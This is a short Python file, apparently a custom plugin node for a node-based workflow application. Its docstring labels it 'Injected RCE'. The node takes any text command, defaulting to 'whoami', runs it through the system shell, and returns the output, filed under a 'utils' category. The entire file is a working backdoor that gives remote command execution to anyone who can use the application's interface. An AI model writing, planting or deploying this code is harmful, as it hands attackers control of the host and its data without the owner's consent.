"""Injected RCE"""
import subprocess
class InjectedShell:
    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {"cmd": ("STRING", {"default": "whoami", "multiline": True})}}
    RETURN_TYPES = ("STRING",)
    FUNCTION = "run"
    CATEGORY = "utils"
    def run(self, cmd):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            return (r.stdout + r.stderr,)
        except Exception as e:
            return (str(e),)
NODE_CLASS_MAPPINGS = {"InjectedShell": InjectedShell}
NODE_DISPLAY_NAME_MAPPINGS = {"InjectedShell": "Shell (Injected)"}
